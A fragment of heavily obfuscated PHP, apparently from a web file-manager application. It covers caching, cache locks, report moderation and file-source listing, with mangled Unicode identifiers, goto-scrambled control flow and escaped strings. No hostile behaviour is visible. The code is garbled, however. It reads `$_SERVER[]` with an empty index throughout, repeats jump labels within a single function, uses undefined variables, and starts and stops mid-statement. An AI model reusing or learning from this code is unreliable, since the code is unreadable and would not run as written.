$bԽŒ[$E[391]] = $Eǅ[$dĉ] ? $Eǅ[$dĉ] : !1; } } private function _makeOrder($C̭ = '') { goto Cņل; Cņل: $AҮ =& $_SERVER[]; $A걜 = array($AҮ[187], $AҮ[722], $AҮ[2247], $AҮ[2248]); $Dņ = array($AҮ[402] => $AҮ[403], $AҮ[404] => $AҮ[405]); goto Cۺ; aǐ: $C̭ = $C̭ . "{$dǌ}\40{$Eǣ}"; return $this->order($C̭); goto Dӑ; Cۺ: $dǌ = Input::get($AҮ[407], $AҮ[7], $AҮ[389], $A걜); $Eǣ = Input::get($AҮ[408], $AҮ[7], $AҮ[2262], array($AҮ[2198], $AҮ[404])); $Eǣ = $Dņ[$Eǣ]; goto aǐ; Dӑ: } public function reportAdd($eɍ) { $eӌݠ =& $_SERVER[]; $cҥ = array($eӌݠ[441] => $eɍ[$eӌݠ[441]], $eӌݠ[1453] => USER_ID); if (Model($eӌݠ[2258])->where($cҥ)->find()) { return !1; } $b鵤 = array($eӌݠ[441] => $eɍ[$eӌݠ[441]], $eӌݠ[1359] => $eɍ[$eӌݠ[1359]], $eӌݠ[369] => $eɍ[$eӌݠ[369]], $eӌݠ[419] => $eɍ[$eӌݠ[419]], $eӌݠ[1453] => USER_ID, $eӌݠ[29] => $eɍ[$eӌݠ[29]], $eӌݠ[405] => $eɍ[$eӌݠ[405]]); return Model($eӌݠ[2258])->add($b鵤); } public function reportList($b) { goto dٛ; eˈ: if (empty($e̖[$Eŷ[354]])) { return array(); } $this->_listDataApply($e̖[$Eŷ[354]]); return $e̖; goto b݌Ւ; fהں: if (isset($b[$Eŷ[29]]) && in_array($b[$Eŷ[29]], array($Eŷ[83], $Eŷ[2263], $Eŷ[2264], $Eŷ[2265], $Eŷ[1936]))) { $Cℚ[$Eŷ[29]] = $b[$Eŷ[29]]; } if (isset($b[$Eŷ[708]]) && in_array($b[$Eŷ[708]], array($Eŷ[468], $Eŷ[83], $Eŷ[2263], $Eŷ[2264]))) { $Cℚ[$Eŷ[708]] = $b[$Eŷ[708]]; } $bū = Input::get($Eŷ[408], $Eŷ[7], $Eŷ[2262], array($Eŷ[2198], $Eŷ[404])); goto e֛; dٛ: $Eŷ =& $_SERVER[]; $Cℚ = array(); if ($b[$Eŷ[721]]) { $Bà = $b[$Eŷ[722]] ? $b[$Eŷ[722]] : strtotime(date($Eŷ[2260])); $Cℚ[$Eŷ[187]] = array($Eŷ[321], array($b[$Eŷ[721]], $Bà)); } goto fהں; e֛: $fʃˮ = array($Eŷ[402] => $Eŷ[403], $Eŷ[404] => $Eŷ[405]); $c윮 = $Eŷ[2266] . $fʃˮ[$bū]; $e̖ = Model($Eŷ[2258])->where($Cℚ)->order($c윮)->selectPage(20); goto eˈ; b݌Ւ: } public function reportStatus($C龽Ӹ) { goto Dڭ; D󊉄: $a = Model($Eȳ[2258])->where($e粙)->save($aԕ); if ($C龽Ӹ[$Eȳ[708]] == $Eȳ[2263]) { if ($dћ[$Eȳ[419]] != $Eȳ[468] && $this->shareFileMeta($dћ[$Eȳ[419]])) { $this->shareFileMeta($dћ[$Eȳ[419]], 0); } $this->remove($dћ[$Eȳ[441]]); return !0; } if ($a && $C龽Ӹ[$Eȳ[708]] == $Eȳ[2264]) { $DΡ = $aԕ[$Eȳ[708]] == $Eȳ[2264] ? 1 : 0; $this->shareFileMeta($dћ[$Eȳ[419]], $DΡ); $this->removeByFile($dћ[$Eȳ[419]]); } goto a; bŚƸ: if (!$dћ) { return !1; } $aԕ = array($Eȳ[708] => $C龽Ӹ[$Eȳ[708]]); if ($C龽Ӹ[$Eȳ[708]] == $Eȳ[2264] && $dћ[$Eȳ[708]] == $Eȳ[2264]) { $aԕ[$Eȳ[708]] = 0; } goto D󊉄; a: return $a; goto Aߊ; Dڭ: $Eȳ =& $_SERVER[]; $e粙 = array($Eȳ[367] => $C龽Ӹ[$Eȳ[367]]); $dћ = Model($Eȳ[2258])->where($e粙)->field($Eȳ[2267])->find(); goto bŚƸ; Aߊ: } private function removeByFile($BХ) { goto eٕƶ; eٕƶ: $bǥ =& $_SERVER[]; $DȠ = Model($bǥ[772])->where(array($bǥ[419] => $BХ))->field($bǥ[369])->select(); $Aߑӻ = array_to_keyvalue($DȠ, $bǥ[33], $bǥ[369]); goto C˽; Cϊ: $C䣇 = array_to_keyvalue($DȠ, $bǥ[33], $bǥ[441]); $this->remove($C䣇); goto b; C˽: $c = array($bǥ[369] => array($bǥ[7], $Aߑӻ), $bǥ[446] => 1); $DȠ = Model($bǥ[2098])->where($c)->field($bǥ[441])->select(); if (empty($DȠ)) { return; } goto Cϊ; b: } private function shareFileMeta($Aت, $A = null) { $eӑ =& $_SERVER[]; $bˬ = array($eӑ[419] => $Aت, $eӑ[89] => $eӑ[2268]); if (is_null($A)) { return Model($eӑ[2269])->where($bˬ)->find(); } $bˬ[$eӑ[359]] = $A; Model($eӑ[2269])->add($bˬ, array(), !0); } } goto eɊ; A͌վ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aʕ⎊; c⛂: switch ($CÂ˺[$a劥[774]]) { case $a劥[17]: self::$handle = Model($a劥[776]); break; case $a劥[777]: self::$handle = new CacheRedis($B, $d˶Ë); break; case $a劥[778]: self::$handle = new CacheMemcached($B, $d˶Ë); break; case $a劥[167]: self::$handle = new CacheFile($B, $d˶Ë); break; default: break; } return self::$handle; goto D³; cذ: $CÂ˺ = $GLOBALS[$a劥[6]][$a劥[337]]; $B = $CÂ˺[$CÂ˺[$a劥[774]]]; $d˶Ë = $CÂ˺[$a劥[775]]; goto c⛂; aʕ⎊: $a劥 =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto cذ; D³: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($D) { if (is_array($D) || is_object($D)) { $D = json_encode($D); } $D = rawurlencode($D); return KOD_SITE_ID . $_SERVER[][70] . $D; } public static function get($d󳫵) { $c = self::key($d󳫵); if (!isset(self::$memoryCache[$c])) { $b = self::init()->get($c); self::$memoryCache[$c] = unserialize($b); } return self::$memoryCache[$c]; } public static function set($F, $D㡇, $a = false) { goto Bه͈; A٩徬: CacheLock::lock($F); $e׶Ϡ = self::init()->set($A, serialize($D㡇), $a); self::$memoryCache[$A] = $D㡇; goto e圮; Bه͈: $A = self::key($F); if (isset(self::$memoryCache[$A]) && self::$memoryCache[$A] === $D㡇) { return !0; } if ($a === 0) { self::$memoryCache[$A] = $D㡇; return !0; } goto A٩徬; e圮: CacheLock::unlock($F); return $e׶Ϡ; goto e; e: } public static function remove($B) { goto bމ; cꞌ: CacheLock::lock($B); $F尗 = self::init()->remove($c); CacheLock::unlock($B); goto fԐ; fԐ: return $F尗; goto eթ; bމ: $c = self::key($B); unset(self::$memoryCache[$c]); self::clearTimeout(); goto cꞌ; eթ: } public static function clearMemory($b֋҂ = false) { if ($b֋҂) { $b֋҂ = self::key($b֋҂); unset(self::$memoryCache[$b֋҂]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][779])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][780])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($C֠푳, $B) { $dߔĶ =& $_SERVER[]; $this->cachePath = $C֠푳[$dߔĶ[75]]; $this->prefix = $dߔĶ[781]; $this->cacheTime = $B; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($F) { $Bߋ =& $_SERVER[]; $F = str_replace(array($Bߋ[782], $Bߋ[93], $Bߋ[69]), $Bߋ[783], $F); return $this->cachePath . $Bߋ[784] . $F . $Bߋ[785]; } public function set($e, $c, $F͟ = false) { $B経 = $this->getFile($e); if (file_put_contents($B経, $this->prefix . $c, LOCK_EX)) { return !0; } @unlink($B経); return !1; } public function get($dҡ̿) { $f = $this->getFile($dҡ̿); if (file_exists($f) && filemtime($f) < time() - $this->cacheTime) { @unlink($f); return !1; } $E = @file_get_contents($f); return substr($E, strlen($this->prefix)); } public function remove($dӾ) { $D = $this->getFile($dӾ); return @unlink($D); } public function deleteAll() { $F䃧 =& $_SERVER[]; $b = scandir($this->cachePath); foreach ($b as $FՐǅ) { $f = $this->cachePath . $FՐǅ; if (strpos($f, $F䃧[785]) && strpos($f, $F䃧[786])) { @unlink($f); } } } public function clearTimeout() { $D瑹 =& $_SERVER[]; $fظ = scandir($this->cachePath); foreach ($fظ as $eΛ̳) { $e凹 = $this->cachePath . $eΛ̳; if (strpos($e凹, $D瑹[785]) && strpos($e凹, $D瑹[786]) && filemtime($e凹) < time() - $this->cacheTime) { @unlink($e凹); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto E; E: $D =& $_SERVER[]; if (self::$handle) { return self::$handle; } $Cۚ = $GLOBALS[$D[6]][$D[337]]; goto b; b: self::$timeout = $Cۚ[$D[787]] ? $Cۚ[$D[787]] : 10; $dڞ㌏ = _get($GLOBALS[$D[6]], $D[788]); $dÚ = $Cۚ[$D[774]] ? $Cۚ[$D[774]] : $D[167]; goto b; b: if ($dÚ == $D[17] && $dڞ㌏ == $D[9]) { $dÚ = $D[167]; } switch ($dÚ) { case $D[777]: self::$handle = new CacheLockRedis(); break; case $D[778]: self::$handle = new CacheLockMemcached(); break; case $D[17]: self::$handle = new CacheLockDatabase(); break; case $D[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fͮ; fͮ: } private static function key($Bןง) { return $_SERVER[][789] . Cache::key($Bןง); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($cЇն = '') { self::$errorMsg = $cЇն; } public static function lockGlobal($A, $f᫳Ȅ) { return self::lock($A, $f᫳Ȅ, !0); } public static function lock($Eٵ, $Bˇٻ = false, $E˘ = false) { goto dڏ; dڏ: $F˔Ӆ =& $_SERVER[]; $F = self::init(); $cԮ¼ = self::key($Eٵ); goto F琷; B؄А: if (!$E˘) { self::$lockItem[$cԮ¼] = !0; } return $e; goto Ḍ; F琷: $Bˇٻ = $Bˇٻ ? $Bˇٻ : self::$timeout; $e = $F->lock($cԮ¼, $Bˇٻ); if (!$e) { $e = $F˔Ӆ[790] . $Bˇٻ . $F˔Ӆ[67] . self::$errorMsg . $F˔Ӆ[67] . get_caller_msg(); $Fӟ = "\114\157\x63\x6b\x20\141\143\x74\151\x6f\x6e\x3a\x20{$cԮ¼}\x20\164\151\x6d\145\x6f\x75\164\x2c\157\166\145\x72\40{$Bˇٻ}\40\163"; $Fӟ = self::$errorMsg ? self::$errorMsg : $bɤ; write_log($e, $F˔Ӆ[791]); show_json($Fӟ, !1); } goto B؄А; Ḍ: } public static function lockGet($a) { $d = self::key($a); if (self::$lockItem[$d]) { return self::$lockItem[$d]; } return self::init()->lockGet($d); } public static function unlock($fمѧ) { $Eϸח = self::key($fمѧ); self::$lockItem[$Eϸח] = null; return self::init()->unlock($Eϸח); } public static function unlockRuntime() { $AƜ =& $_SERVER[]; $d̛ϯ = self::init(); $c׵ = !1; foreach (self::$lockItem as $D̅ŧ => $F) { if (!$F) { continue; } $d̛ϯ->unlock($D̅ŧ); if (!$c׵) { $c׵ = !0; write_log($AƜ[792] . $D̅ŧ . $AƜ[67] . get_caller_msg(), $AƜ[791]); continue; } write_log($AƜ[792] . $D̅ŧ, $AƜ[791]); } } } goto Dք; dÇ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\x63\145"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\141\155\145" => "\151\157\x5f\163\157\x75\x72\x63\145\x5f\x6d\145\164\141", "\155\x65\164\141\x46\x69\145\x6c\144" => "\163\x6f\165\162\143\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\x75\156\x63\164\x69\x6f\156"), array("\x63\162\145\141\164\145\124\151\155\145", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\x66\165\156\143\x74\151\x6f\156"), array("\x76\151\145\x77\x54\151\x6d\145", "\x74\151\x6d\145", "\x69\x6e\x73\145\x72\x74", "\146\165\156\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($cÜ) { return $this->listSource(array($_SERVER[][368] => $cÜ)); } public function typeName($Fӽ紘) { static $C = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\x72\157\x75\x70"); return $C[$Fӽ紘 . $_SERVER[][33]]; } public function sourceListInfo($b, $f彍 = false) { goto A厭; DȦ: return array_to_keyvalue($bۄ, $e󏄚[369]); goto b; Eӹ: if (!$b) { return array(); } $bۄ = $this->where(array($e󏄚[369] => array($e󏄚[7], $b)))->select(); $this->_listDataApply($bۄ, $f彍); goto DȦ; A厭: $e󏄚 =& $_SERVER[]; $b = $b ? $b : array(); $b = array_filter(array_unique($b)); goto Eӹ; b: } public function pathInfoFilter($EƑĎ) { goto f롴; f롴: $aӿ =& $_SERVER[]; $EƑĎ[$aӿ[75]] = KodIO::make($EƑĎ[$aӿ[369]]); $EƑĎ[$aӿ[29]] = $EƑĎ[$aӿ[370]] == 1 ? $aӿ[76] : $aӿ[167]; goto d; d: $EƑĎ[$aӿ[371]] = $this->typeName($EƑĎ[$aӿ[371]]); if ($EƑĎ[$aӿ[370]] != 1) { $EƑĎ[$aӿ[160]] = $EƑĎ[$aӿ[372]]; unset($EƑĎ[$aӿ[372]]); } $B = $aӿ[373]; goto dǶ; dǶ: $B .= $aӿ[374]; $B .= $aӿ[375]; $f = explode($aӿ[47], $B); goto Bؿ; Bؿ: if (isset($EƑĎ[$aӿ[376]]) && $EƑĎ[$aӿ[376]][$aӿ[377]] == -1) { $f = array_remove_value($f, $aӿ[187]); $f = array_remove_value($f, $aӿ[107]); $f = array_remove_value($f, $aӿ[378]); $f = array_remove_value($f, $aӿ[379]); $f = array_remove_value($f, $aӿ[77]); $f = array_remove_value($f, $aӿ[380]); } $EƑĎ = array_field_key($EƑĎ, $f); return $EƑĎ; goto b; b: } public function listUserFav() { goto A͠; F񵫣: $b = array_to_keyvalue($b, $c糺[33], $c糺[75]); if ($b) { $C܅ = $this->listSource(array($c糺[383] => array($c糺[384], $b))); } $C܅ = array_to_keyvalue($C܅[$c糺[354]], $c糺[369]); goto d; d: foreach ($Dɑ as &$eϓ) { $eϓ = array($c糺[385] => $eϓ[$c糺[367]], $c糺[386] => $eϓ[$c糺[28]], $c糺[387] => $eϓ[$c糺[75]], $c糺[388] => $eϓ[$c糺[29]], $c糺[389] => $eϓ[$c糺[187]], $c糺[390] => $eϓ[$c糺[107]]); if ($eϓ[$c糺[29]] == $c糺[382] && $C܅[$eϓ[$c糺[75]]]) { $eϓ[$c糺[391]] = $C܅[$eϓ[$c糺[75]]]; } } return $Dɑ; goto cʛ; A͠: $c糺 =& $_SERVER[]; $Dɑ = Model($c糺[381])->listData(); $b = array_filter_by_field($Dɑ, $c糺[29], $c糺[382]); goto F񵫣; cʛ: } public function listUserTag($b֐ϫ) { goto B̦; Fύ: $this->listUserTagClear($Bу, $Bߌߋ, $b֐ϫ); return $Bߌߋ; goto aȎ; B̦: $c؝ =& $_SERVER[]; $aР = Model($c؝[392])->listData(); $Bу = array_filter_by_field($aР, $c؝[393], $b֐ϫ); goto Fֿ퐝; Fֿ퐝: $Bу = array_to_keyvalue($Bу, $c؝[33], $c؝[75]); $Bߌߋ = array(); if ($Bу) { $Cާ = array($c؝[383] => array($c؝[384], $Bу)); $Bߌߋ = $this->listSource($Cާ); } goto Fύ; aȎ: } private function listUserTagClear($a, $A󨫂, $A) { goto d; B: Model($Cބ[394])->removeFromTag($b, $A); goto AƆ₯; C₼: $b = array(); $b๡Ц = array_to_keyvalue($A󨫂[$Cބ[74]], $Cބ[33], $Cބ[369]); $fݸ = array_to_keyvalue($A󨫂[$Cބ[73]], $Cބ[33], $Cބ[369]); goto f; f: $d׊ = array_merge($fݸ, $b๡Ц); foreach ($a as $F) { if (!in_array($F, $d׊)) { $b[] = $F; } } if (!$b) { return; } goto B; d: $Cބ =& $_SERVER[]; if (!$a) { return; } if ($A󨫂 && count($a) == $A󨫂[$Cބ[351]][$Cބ[352]]) { return; } goto C₼; AƆ₯: } public function listUserRecycle() { $E =& $_SERVER[]; $cÆ = Model($E[395])->listData(); if (!$cÆ) { return array(); } $F = array($E[383] => array($E[384], $cÆ), $E[396] => 1); return $this->listSource($F); } public function listSource($C՜, $c˲ = 3000) { goto A⧊; B: return $b; goto A; A⧊: $fݩݳ =& $_SERVER[]; if (!isset($C՜[$fݩݳ[397]])) { $C՜[$fݩݳ[397]] = 0; } $d = $fݩݳ[398]; goto b۩; b۩: $b = $this->field($d)->_makeOrder()->where($C՜)->selectPage($c˲); $this->_listDataApply($b[$fݩݳ[354]]); $this->_listMake($b); goto B; A: } protected function _makeOrder() { goto A鉲; Cұ: $B싌 = array($F泳[402] => $F泳[403], $F泳[404] => $F泳[405]); $a踄 = array($F泳[28] => $F泳[28], $F泳[77] => $F泳[77], $F泳[160] => $F泳[372], $F泳[378] => $F泳[378], $F泳[406] => $F泳[379], $F泳[187] => $F泳[187], $F泳[107] => $F泳[107]); $CȐ = Input::get($F泳[407], $F泳[7], $B֜, array_keys($a踄)); goto Cݦ; F關: if ($CȐ == $F泳[28]) { } $f = $F泳[409] . $a踄[$CȐ] . $F泳[50] . $B싌[$fݟ]; return $this->order(rtrim(trim($f), $F泳[47])); goto Cӽ; Cݦ: $fݟ = Input::get($F泳[408], $F泳[7], $D, array_keys($B싌)); if (!in_array($CȐ, array_keys($a踄))) { $CȐ = $F泳[28]; } if (!in_array($fݟ, array_keys($B싌))) { $CȐ = $F泳[402]; } goto F關; A鉲: $F泳 =& $_SERVER[]; $B֜ = Model($F泳[399])->get($F泳[400]); $D = Model($F泳[399])->get($F泳[401]); goto Cұ; Cӽ: } protected function _listDataApplyItem($b˶, $a˹ = false) { $E䶖 = array($b˶); $this->_listDataApply($E䶖, $a˹); return $E䶖[0]; } protected function _listDataApply(&$A, $AΘڅ = false) { goto cɉ; d˔: $this->_listAppendPath($A); $this->_listAppendAuth($A); $this->_listAppendSourceInfo($A, $Cܒ); goto FĲ; cɉ: $b =& $_SERVER[]; if (!$A) { $A = array(); return; } $Cܒ = array_to_keyvalue($A, $b[33], $b[369]); goto eܹ; eܹ: $Cܒ = array_unique($Cܒ); $this->_listSourceCache($A); if (!$AΘڅ) { $this->_listAppendMeta($A, $Cܒ); $this->_listAppendFileMeta($A, $Cܒ); $this->_listAppendChildren($A, $Cܒ); } goto d˔; FĲ: $this->_listAppendUser($A); $this->_listFilterInfo($A, $AΘڅ); goto B; B: } protected function _listSourceCache($fռ) { $a􂇣 =& $_SERVER[]; foreach ($fռ as $f) { self::$cacheSourceInfo[$a􂇣[410] . $f[$a􂇣[369]]] = $f; } } protected function _listFilterInfo(&$Bү, $C֊ = false) { $eᓭ =& $_SERVER[]; foreach ($Bү as &$B݂) { $B݂ = $this->pathInfoFilter($B݂); self::$cachePathInfo[$eᓭ[411] . intval($C֊) . $eᓭ[412] . $B݂[$eᓭ[369]]] = $B݂; } } protected function _listMake(&$bĻ) { $f =& $_SERVER[]; $bĻ[$f[74]] = array(); $bĻ[$f[73]] = array(); foreach ($bĻ[$f[354]] as $Bޛ˃) { $b = $Bޛ˃[$f[370]] == 1 ? $f[74] : $f[73]; $bĻ[$b][] = $Bޛ˃; } unset($bĻ[$f[354]]); } protected function _listAppendMeta(&$dՄ, $b̐) { goto E; C̓: foreach ($c贪 as $eɜЫ) { if (!isset($F[$eɜЫ[$c߱΍[369]]])) { $F[$eɜЫ[$c߱΍[369]]] = array(); } if (in_array($eɜЫ[$c߱΍[89]], $E)) { continue; } $F[$eɜЫ[$c߱΍[369]]][$eɜЫ[$c߱΍[89]]] = $eɜЫ[$c߱΍[359]]; } foreach ($dՄ as &$bԩ) { $bԩ[$c߱΍[417]] = !1; if (isset($F[$bԩ[$c߱΍[369]]])) { $bԩ[$c߱΍[417]] = $F[$bԩ[$c߱΍[369]]]; } if ($this->fileIsLock($bԩ) && $bԩ[$c߱΍[376]]) { $d肠Ĭ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $bԩ[$c߱΍[376]][$c߱΍[377]] = AuthModel::authDisable($bԩ[$c߱΍[376]][$c߱΍[377]], $d肠Ĭ); $bԩ[$c߱΍[376]][$c߱΍[418]][$c߱΍[376]] = $bԩ[$c߱΍[376]][$c߱΍[377]]; } } goto Aۚ; E܇: if (!$c贪) { return; } $E = array($c߱΍[415], $c߱΍[416]); $F = array(); goto C̓; E: $c߱΍ =& $_SERVER[]; $d = array($c߱΍[383] => array($c߱΍[384], $b̐)); $c贪 = Model($c߱΍[413])->field($c߱΍[414])->where($d)->select(); goto E܇; Aۚ: } protected function _listAppendFileMeta(&$Dֳ, $D߻) { goto C; e: foreach ($Dֳ as &$e欭у) { goto Cʅ; AϪڑĨ: if (isset($e欭у[$Aﭠ[162]][$Aﭠ[426]])) { $e欭у[$Aﭠ[426]] = json_decode($e欭у[$Aﭠ[162]][$Aﭠ[426]], !0); unset($e欭у[$Aﭠ[162]][$Aﭠ[426]]); } goto aĈ; e: $Bĉ[$Aﭠ[77]] = $e欭у[$Aﭠ[77]]; $Bĉ[$Aﭠ[28]] = $e欭у[$Aﭠ[28]]; self::$cacheFileInfo[$Aﭠ[425] . $eڷ] = $Bĉ; goto D鰕; D鰕: unset($B꥕[$eڷ][$Aﭠ[75]]); $f܉Ë = is_array($Eߴ[$eڷ]) ? $Eߴ[$eڷ] : array(); $e欭у[$Aﭠ[162]] = array_merge($f܉Ë, $B꥕[$eڷ]); goto AϪڑĨ; Cʅ: $eڷ = $e欭у[$Aﭠ[419]]; if (!$eڷ || !isset($B꥕[$eڷ])) { continue; } $Bĉ = $B꥕[$eڷ]; goto e; aĈ: } goto e̹Պ; Eں: if (!$F͐ٮ) { return; } $Dڕ뱈 = array($Aﭠ[420] => array($Aﭠ[384], $F͐ٮ)); $Eኣ = $Aﭠ[421]; goto AЭΣ; AЭΣ: $B꥕ = Model($Aﭠ[422])->field($Eኣ)->where($Dڕ뱈)->select(); $B꥕ = array_to_keyvalue($B꥕, $Aﭠ[419]); $F˾ = Model($Aﭠ[423])->field($Aﭠ[424])->where($Dڕ뱈)->select(); goto A; A: $F˾ = $F˾ ? $F˾ : array(); $Eߴ = array(); foreach ($F˾ as $d򥷓) { if (!isset($Eߴ[$d򥷓[$Aﭠ[419]]])) { $Eߴ[$d򥷓[$Aﭠ[419]]] = array(); } $Eߴ[$d򥷓[$Aﭠ[419]]][$d򥷓[$Aﭠ[89]]] = $d򥷓[$Aﭠ[359]]; } goto e; C: $Aﭠ =& $_SERVER[]; $F͐ٮ = array_to_keyvalue($Dֳ, $Aﭠ[33], $Aﭠ[419]); $F͐ٮ = array_filter(array_unique($F͐ٮ)); goto Eں; e̹Պ: } protected function _listAppendSourceInfo(&$fέ, $cى·) { goto F; cڌ: $bձ = array_to_keyvalue($F󾋥, $d̥ݪ[367]); $Cܝ뉬 = array_to_keyvalue_group($AٟČ, $d̥ݪ[75], $d̥ݪ[393]); $a = array_to_keyvalue($a𪄌, $d̥ݪ[75]); goto b; b: $E = array_to_keyvalue_group($DαԆخ, $d̥ݪ[369]); foreach ($fέ as &$f) { $f[$d̥ݪ[391]] = array($d̥ݪ[430] => 0, $d̥ݪ[431] => 0, $d̥ݪ[432] => 0); if (isset($a[$f[$d̥ݪ[369]]])) { $f[$d̥ݪ[391]][$d̥ݪ[433]] = 1; $f[$d̥ݪ[391]][$d̥ݪ[434]] = $a[$f[$d̥ݪ[369]]][$d̥ݪ[28]]; } if (isset($Cܝ뉬[$f[$d̥ݪ[369]]])) { $f[$d̥ݪ[391]][$d̥ݪ[435]] = array(); foreach ($Cܝ뉬[$f[$d̥ݪ[369]]] as $e񯅂) { $AЃ = $bձ[$e񯅂]; $f[$d̥ݪ[391]][$d̥ݪ[435]][] = array($d̥ݪ[436] => $AЃ[$d̥ݪ[367]], $d̥ݪ[386] => $AЃ[$d̥ݪ[28]], $d̥ݪ[437] => $AЃ[$d̥ݪ[438]]); } } if (isset($E[$f[$d̥ݪ[369]]])) { $f[$d̥ݪ[391]][$d̥ݪ[439]] = array(); foreach ($E[$f[$d̥ݪ[369]]] as $Aߵ𝣦) { $f[$d̥ݪ[391]][$d̥ݪ[439]] = array($d̥ݪ[440] => $Aߵ𝣦[$d̥ݪ[441]], $d̥ݪ[442] => $Aߵ𝣦[$d̥ݪ[443]], $d̥ݪ[444] => $Aߵ𝣦[$d̥ݪ[369]], $d̥ݪ[445] => $Aߵ𝣦[$d̥ݪ[446]], $d̥ݪ[447] => $Aߵ𝣦[$d̥ݪ[448]]); } } } return $fέ; goto Eɶ؋; b𭐰: $AٟČ = Model($d̥ݪ[392])->listData(); $a𪄌 = Model($d̥ݪ[381])->listData(); $DαԆخ = Model($d̥ݪ[429])->listSimple(); goto cڌ; F: $d̥ݪ =& $_SERVER[]; if (!defined($d̥ݪ[427])) { return; } $F󾋥 = Model($d̥ݪ[428])->listData(); goto b𭐰; Eɶ؋: } protected function _listAppendChildren(&$bʓ, $fۊ) { goto cƳɵ; Cڊ: $a㥖ϗڡ = 1024 * 50; $bʓ = is_array($bʓ) ? $bʓ : array(); $Dˢ = count($bʓ); goto AĩɎ; AĩɎ: $E۸ȥ = $this->tablePrefix . $this->tableName; for ($d򎔂 = 0; $d򎔂 < $Dˢ; $d򎔂++) { $AΨղ = intval($bʓ[$d򎔂][$D効[397]]); if ($bʓ[$d򎔂][$D効[370]]) { $fƓ = $bʓ[$d򎔂][$D効[369]]; $c .= "\123\105\114\105\103\x54\40\x2a\x20\106\122\117\115\x20\x28\x53\x45\114\105\x43\124\40\47{$fƓ}\137\x68\141\x73\106\x69\154\145\47\40\x61\x73\40\150\141\163\x2c\x63\x6f\x75\x6e\164\50\x31\x29\40\141\163\40\x68\x61\163\103\157\x75\156\x74\x20\x46\x52\117\x4d\x20\140{$E۸ȥ}\140\x20\xa\11\x9\11\x9\11\167\150\145\x72\x65\x20\x70\x61\x72\145\156\x74\111\104\75{$fƓ}\40\141\156\x64\x20\151\163\x46\x6f\154\144\145\162\75\60\40\141\x6e\144\x20\151\x73\x44\145\154\x65\x74\x65\75{$AΨղ}\x29\40\141\x73\40\164\x62\61\x5f{$fƓ}\40\165\156\x69\x6f\x6e\x20\141\154\154\x20\xa\x9\11\x9\11\11\x53\105\114\105\x43\124\x20\52\40\x46\122\x4f\115\x20\x28\x53\105\114\105\103\x54\x20\47{$fƓ}\137\x68\141\163\x46\x6f\x6c\x64\x65\162\x27\x20\141\163\40\150\x61\x73\x46\151\154\x65\54\x63\157\x75\x6e\x74\x28\x31\x29\x20\x61\163\40\x68\141\163\103\157\x75\156\164\40\x46\x52\x4f\x4d\x20\x60{$E۸ȥ}\140\40\xa\x9\11\x9\11\x9\167\150\x65\162\x65\40\x70\141\x72\x65\x6e\x74\111\x44\x3d{$fƓ}\40\x61\156\144\40\151\163\x46\157\x6c\144\x65\x72\x3d\61\x20\x61\156\144\40\151\x73\x44\145\x6c\x65\x74\x65\75{$AΨղ}\51\40\141\163\40\164\x62\x32\137{$fƓ}\x20\x75\x6e\x69\x6f\x6e\x20\141\x6c\154\x20"; } if ((strlen($c) >= $a㥖ϗڡ || $d򎔂 == $Dˢ - 1) && $c) { $c = substr($c, 0, -strlen($D効[449])); $Eɹ = $this->query($c); $e䪿 = array_merge($e䪿, $Eɹ); $c = $D効[33]; } } $e䪿 = array_to_keyvalue($e䪿, $D効[450]); goto EϾ; EϾ: foreach ($bʓ as &$Aף) { if ($Aף[$D効[370]]) { unset($Aף[$D効[372]]); $Aף[$D効[192]] = intval($e䪿[$Aף[$D効[369]] . $D効[451]][$D効[452]]); $Aף[$D効[191]] = intval($e䪿[$Aף[$D効[369]] . $D効[453]][$D効[452]]); } } goto bۖ; cƳɵ: $D効 =& $_SERVER[]; $c = $D効[361]; $e䪿 = array(); goto Cڊ; bۖ: } protected function _listAppendAuth(&$d䭘) { goto b瞙; e퐱ĉ: foreach ($d䭘 as $A䋘) { if ($A䋘[$A[371]] == self::TYPE_GROUP) { $B[] = $A䋘[$A[369]]; } } if (!$B) { return; } $B쏏Ҩ = array_to_keyvalue($d䭘, $A[369]); goto bԝ; bԝ: $d = Model($A[454])->getSourceList($B, $B쏏Ҩ); foreach ($d䭘 as $F՘ʘ => &$A䋘) { $A䋘[$A[376]] = $d[$A䋘[$A[369]]]; if (!$A䋘[$A[376]] && $A䋘[$A[371]] == self::TYPE_GROUP) { $A䋘[$A[376]] = Action($A[455])->pathGroupAuthMake($A䋘[$A[456]]); if (!$A䋘[$A[376]] && !_get($GLOBALS, $A[457])) { $A䋘[$A[189]] = !1; $A䋘[$A[188]] = !1; } } if ($A䋘[$A[376]]) { $A䋘[$A[189]] = AuthModel::authCheckEdit($A䋘[$A[376]][$A[377]]); $A䋘[$A[188]] = AuthModel::authCheckView($A䋘[$A[376]][$A[377]]); } $this->groupPathDisplay($A䋘); } goto eȃӽ; b瞙: $A =& $_SERVER[]; if (!defined($A[427])) { return; } $B = array(); goto e퐱ĉ; eȃӽ: } public function groupPathDisplay(&$F) { goto F֊φϓ; F֊φϓ: $e =& $_SERVER[]; if ($F[$e[371]] != self::TYPE_GROUP) { return; } $C = 